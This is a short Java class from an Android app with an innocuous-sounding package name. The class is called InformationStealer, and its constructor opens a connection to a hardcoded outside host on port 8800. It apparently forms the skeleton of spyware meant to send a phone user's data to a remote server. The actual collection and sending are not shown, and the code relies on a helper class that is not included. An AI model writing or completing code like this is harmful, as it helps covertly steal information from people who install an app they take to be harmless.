package com.example.applicazioneinteressante;

import android.content.pm.PackageManager;

public class InformationStealer {

    NetworkManager conn = new NetworkManager();
    public InformationStealer(){
        conn.openConnection("rblob.homepc.it", 8800);
    }

}

